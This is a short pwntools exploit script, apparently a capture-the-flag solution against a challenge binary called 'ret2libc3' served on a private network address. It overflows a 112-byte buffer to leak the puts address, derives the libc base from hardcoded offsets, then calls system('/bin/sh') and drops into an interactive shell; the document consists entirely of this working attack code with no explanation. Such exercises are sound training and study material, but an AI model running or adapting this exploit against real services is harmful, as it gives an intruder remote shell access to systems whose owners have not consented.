from pwn import *

p = remote("192.168.18.104",10002)

elf = ELF("./ret2libc3")
puts_glt = elf.plt["puts"]
main_addr = elf.symbols["_start"]
puts_got = elf.got["puts"]

payload1 = b'A'*112 + p32(puts_glt) + p32(main_addr) + p32(puts_got)
p.sendlineafter("Can you find it !?",payload1)

addr = u32(p.recv()[0:4])

print hex(addr)

puts_offset = 0x071290

libcbase = addr - puts_offset

system_offset = 0x045420
bin_sh_offset = 0x18f352

system_addr = libcbase + system_offset
bin_sh_addr = libcbase + bin_sh_offset

payload2 = b'A' * 112 + p32(system_addr) + p32(0) + p32(bin_sh_addr)

p.sendline(payload2)
p.interactive()
